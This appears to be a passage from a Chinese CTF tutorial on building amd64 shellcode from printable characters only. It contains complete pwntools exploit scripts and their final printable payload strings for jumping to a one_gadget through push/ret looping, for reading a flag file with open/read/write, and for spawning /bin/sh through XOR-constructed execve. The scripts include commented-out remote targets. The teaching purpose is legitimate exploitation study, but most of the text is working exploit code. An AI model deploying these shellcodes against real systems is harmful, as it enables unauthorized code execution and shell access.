
```
root@ubuntu:~/pwn/# one_gadget libc.so.6
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
rsp & 0xf == 0
rcx == NULL
```

然后算出偏移，这次我们选用的相关`libc`地址是`__libc_start_main+231`，这个地址在栈中经常出现，更容易获得，可以说是几乎每道题都能找得到，而`mmap`的地址可不是每道题都有

```
>>> hex(0x7fea022b6c87-0x7fea02295000-0x4f2a5)
'-0x2d61e'
```

那么偏移量就是`0x2d61e`，看似我们还是无法构造出其中的`0xd6`字节，那么将这个值除以2看看

```
>>> hex(0x2d61e//2)
'0x16b0f'
```

这个值中包含`[0x01,0x6b,0x0f]`，我们就很好构造了，那么怎么通过这个值构造回`0x2d61e`，最直接的办法肯定是造两个`add`指令，将`__libc_start_main+231`加上两个`0x16b0f`就获得`one_gadget`地址，但是，不是每个偏移量除一次就能获得好构造的字节的，如果除5次好利用就造5个`add`指令将会大大消耗`shellcode`的字节数，而且造指令也挺麻烦，偏移量需要是可以使用的字符作为立即数，那么我们换个思路，我们控制`add`指令执行多少次，那就避免了疯狂造指令的行为，所以这里是要介绍通过`push+ret`来实现流程控制的方法

先放出最终`exp`：

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p = process('./shellcode')
#p = remote('119.3.83.106',10565)
elf = ELF('./shellcode')
libc = elf.libc
one = [0x4f2a5,0x4f302,0xe534f,0xe54f7,0xe54fe,0xe5502,0xe553d,0x10a2fc,0x10a308]
payload = asm('''
push rcx #垫一下，之后满足rsp&0xf=0的条件
push rax
pop rdx #rdx=shellcode_addr
push rsp
pop rax #rax=rsp
pop rcx
pop rcx
pop r10 #r10=__libc_csu_init=0xxxxxxxxxxxxxa0
pop rcx
pop rcx
pop rcx
pop rcx
pop r8 #save __libc_start_main+231
pop rcx
pop rcx
push r9 #r9=0
push 0x42425a5a
pop rcx
xor dword ptr [rax+0x48],ecx #相当于往rsp+0x48写入0x42425a5a，因为本来值为0
push 0x55
pop rcx
xor dword ptr [rax+0x48],ecx
push 0x31
pop rcx
xor dword ptr [rax+0x49],ecx
push 0x43
pop rcx
xor dword ptr [rax+0x4a],ecx
push 0x42
pop rcx
xor dword ptr [rax+0x4b],ecx #0x42425a5a^0x42433155=0x16b0f
push r10
pop rcx
xor dword ptr [rdx+0x68],ecx #将xxxxxxa0写入shellcode_addr+0x58
push 0x52
pop rcx
xor dword ptr [rdx+0x68],ecx
push 0x31
pop rcx
xor dword ptr [rdx+0x68],ecx #0xa0^0x52^0x31=0xc3=ret
push 0x43
pop rcx
xor dword ptr [rdx+0x59],ecx #造add qword ptr [rax+0x48],rdx
push rax
pop rcx #save stack_addr
push rdx
pop rax #rax=shellcode_addr
pop rdx #rdx=0x16b0f
push r8 #r8=__libc_start_main+231
xor al,0x58 #构造出add指令的位置
push rax #push之后就能再次执行
push rcx
pop rax #还原rax为stack_addr
''')
payload += b'HBPH' #占位，之后xor成add指令
payload += asm('''
push r10 #无意义，填充偏移
pop rcx
push rcx
pop rcx
push rcx
pop rcx
push rcx
pop rcx
push r9 #r9=0
pop rcx #rcx=0，满足one_gadget条件
''')
print(payload)
p.sendafter(b'you',payload)
p.interactive()
```

可见字符payload：

```
QPZTXYYAZYYYYAXYYAQhZZBBY1HHjUY1HHj1Y1HIjCY1HJjBY1HKARY1JhjRY1Jhj1Y1JhjCY1JYPYRXZAP4XPQXHBPHARYQYQYQYAQY
```

动态调试起来讲解一下怎么实现流程控制的部分

![image-20221007182844975](upload/attach/202210/903037_R8MZQJHDV9GYTBG.png)

首先构造出`ret`指令，这个在前面用过，这里就不再提，之后执行`xor dword ptr [rdx+0x59],ecx`是异或`HBPH`字符，之后造出`add dword ptr [rax + 0x48], edx`指令用来将`__libc_start_main+231`修改为`one_gadget`地址

![image-20221007183805749](upload/attach/202210/903037_5YZ4M7GRP9YMJB2.png)

然后这里有个`xor al,0x58; push rax`，此时`rax=shellcode_addr`，所以构造出`shellcode_addr+0x58`，这个位置就是`add`指令的位置

![image-20221007184132059](upload/attach/202210/903037_QJF2PV39F95PHQG.png)

![image-20221007184225777](upload/attach/202210/903037_A6J5NYEWMG2YX8B.png)

现在是在执行第一次的`add`指令

![image-20221007184334650](upload/attach/202210/903037_B9XPRSB4455E9PD.png)

![image-20221007184355425](upload/attach/202210/903037_KQ99NXCC382RH7E.png)

然后执行`ret`的时候，跳回之前`add`指令的地方再次执行，可以看到现在栈顶就是`one_gadget`的地址，之后再次`ret`的时候就跳到`one_gadget`来`getshell`了，所以说我们需要控制重复执行的指令在`shellcode`的尾部，之后构造出要重复执行指令的位置进行`push`，控制`push`的次数以及`ret`指令就能控制执行重复指令的次数，实现循环的效果，这里需要注意一下我选用的修改`libc`地址的指令为`add qword ptr [rax+0x48],rdx`，而默认NULL字符解析的指令是`add byte ptr [rax], al`会影响到构造偏移值的过程，所以造的`ret`指令需要紧跟着`shellcode`最后面，或者选用其他指令来避免

## 0x05 ORW

> 在熟悉流程控制的技巧之后，我觉得还有一个更实用的案例就是ORW，首先将各种参数push进栈，最后循环进行pop设置参数以及三次syscall，分别是open、read、write，这样就能大大节省指令长度，而且更加贴近赛题，众所周知，想要快速提升pwn题目的复杂度首要操作就是禁止getshell只能ORW

不过这里没什么新的东西可说了，有不懂的地方可以先看后一节的构造`execve`系统调用再回来看，这里就直接贴出exp，这段`shellcode`需要满足两个条件，`1. rax = shellcode_addr`，`2. r8~r15`其中一个寄存器为0即可，这里可以根据实际环境替换`shellcode`中使用的`r9`寄存器

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p = process('./shellcode')
#p = remote('119.3.83.106',10565)
payload = asm('''
push 0x52545953 #xor造flag字符串
pop rcx
xor dword ptr [rax+0x68],ecx
pop rcx #xor造ret指令
pop rcx
xor dword ptr [rax+0x59],ecx
push 0x52
pop rcx
xor dword ptr [rax+0x59],ecx
push 0x444e6f6e #xor造pop_rdi/pop_rsi/syscall指令
pop rcx
xor dword ptr [rax+0x55],ecx
push rax
xor al,0x53
push rax #构造出循环开始的地址
pop r10
pop rax #还原rax
push r9 #r9=0
pop rcx #rcx=0
push r10 #布置write参数
xor al,0x68
push rax
pop rdx
push rdx #rsi=buf=shellcode_addr+0x68
push 0x43
pop rax
xor al,0x42 #write_rdi=fd=1
push rax
push 0x50 #write_rdx=len
push 0x42
pop rax
xor al,0x43
push rax #write_syscall_num=1
push r10 #布置read参数
push rdx #read_rsi=shellcode_addr+0x68
push 0x41
pop rax
xor al,0x42
push rax #read_rdi=fd=3
push 0x50 #read_rdx=len
push rcx #read_syscall_num=0
push r10 #布置open参数
push rcx #open_rsi=0
push rdx #open_rdi=str_flag_addr
push rcx #open_rdx=0
push 0x41
pop rax
xor al,0x43
push rax #open_syscall_num=2
pop rax #循环开始
pop rdx
''')
payload += b'1' #之后xor成pop rdi指令
payload += b'1' #之后xor成pop rsi指令
payload += b'AA' #之后xor成syscall指令
payload += b'1111' #之后xor成ret指令
payload += b'5'*15 #之后xor成flag字符串,偏移不够需要填充
print(payload)
p.sendafter(b'you',payload)
p.interactive()
```

可见字符payload：

```
hSYTRY1HhYY1HYjRY1HYhnoNDY1HUP4SPAZXAQYAR4hPZRjCX4BPjPjBX4CPARRjAX4BPjPQARQRQjAX4CPXZ11AA1111555555555555555
```

## 0x06 execve

> 通过跳回main函数片段以及寻找one_gadget的方式来利用并不通用，肯定是会受到环境的影响，相比起来，直接利用可见字符构造系统调用getshell才是 ~~最稳定~~ 最帅 的方式

核心操作还是利用`xor`指令，这里就不多说，列出一些通过异或构造的值

```
0x41^0x6e=0x2f /
0x41^0x6f=0x2e .
0x35^0x41^0x5a=0x2e .
0x42^0x31=0x73 s
0x59^0x31=0x68 h
0x68可以直接用 h
0x53^0x31=0x62 b
0x58^0x31=0x69 i
0x5a^0x34=0x6e n
0x6e可以直接用
0x31^0x41^0x4b=0x3b #rax值
0x41414141^0x4141444e=0x50f #050f是syscall指令
```

贴出最终`exp`，在这个`exp`中大概只需要满足一个条件：`rax = shellcode_addr`，其次是`r9 = 0`，这条指令中的寄存器可以直接改成`r8-r15`中任意一个，而不用修改偏移，只要其中一个寄存器值为0即可，这个概率太大了，所以这个条件几乎可以忽略。如果需要在其他题目中使用这段`shellcode`需要先让`rax = shellcode_addr`，其次要手动校正其中的偏移量。`exp`在常用的`pwn`题系统版本`ubuntu 16/18/20/22`上经过测试，工作良好。

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p = process('./shellcode')
#p = remote('119.3.83.106',10565)
elf = ELF('./shellcode')
payload = asm(
'''
xor al,0x31
push 0x68 #构造/bin/sh字符串
pop rcx
xor dword ptr [rax+0x54],ecx #h
push 0x42
pop rcx
xor dword ptr [rax+0x53],ecx #0x42
push 0x31
pop rdx
xor dword ptr [rax+0x53],edx #0x42^0x31=0x73=s
push 0x41
pop rcx
xor dword ptr [rax+0x52],ecx #0x41
xor dword ptr [rax+0x4e],ecx #0x41
push 0x6e
pop rcx
xor dword ptr [rax+0x52],ecx #0x41^0x6e=0x2f=/
xor dword ptr [rax+0x4e],ecx #0x41^0x6e=0x2f=/
xor dword ptr [rax+0x51],ecx #n
push 0x58
pop rcx
xor dword ptr [rax+0x50],ecx #0x58
xor dword ptr [rax+0x50],edx #0x58^0x31=0x69=i
push 0x53
pop rcx
xor dword ptr [rax+0x4f],ecx #0x53
xor dword ptr [rax+0x4f],edx #0x53^0x31=0x62=b
xor al,0x31 #shellcode_addr
xor dword ptr [rax+0x42],edx #在+0x43偏移构造pop rsi指令(0x5e)
push r14 #r14=0,可以直接换成r8-r15进行尝试
outsd dx, dword ptr [rsi] #这个指令的值为0x6f，相当于占位操作，之后xor修改指令
xor dword ptr [rax+0x4b],edx #在+0x4a偏移构造pop rdi指令(0x5f)
xor al,0x31
xor al,0x4e #/bin/sh字符串地址
push rax
outsb dx, byte ptr [rsi] #这个指令的值为0x6e，相当于占位
xor al,0x4e #shellcode_addr+0x31
push rax #无意义，填充偏移
push 0x4141444e
pop rcx
xor dword ptr [rax+0x31],ecx #0x41414141^0x4141444e=0x00050f(syscall)
push rdx
pop rax #rax=0x31
xor al,0x41
xor al,0x4b #0x31^0x41^0x4b=0x3b,execve调用号
push rsi
pop rdx #清零rdx
''')
payload += b'AAAA' #提前布置0x41414141
print(payload)
p.sendafter(b'you',payload)
p.interactive()
```

注意一下，虽然都是可见字符，但是不能直接运行`./shellcode`来传入，因为输入的时候会带回车

可见字符payload：

```
41jhY1HTjBY1HSj1Z1PSjAY1HR1HNjnY1HR1HN1HQjXY1HP1PPjSY1HO1PO411PBAVo1PK414NPn4NPhNDAAY1H1RX4A4KVZAAAA
```

其中使用的独特字符，共22个：

```
['4', '1', 'j', 'h', 'Y', 'H', 'T', 'B', 'S', 'Z', 'P', 'A', 'R', 'N', 'n', 'Q', 'X', 'O', 'V', 'o', 'K', 'D']
```

## 0x07 技巧总结

> 回顾一下在前面实际利用方式中出现的姿势，以及介绍一些没能用上的一些技巧

1. 以不变应万变
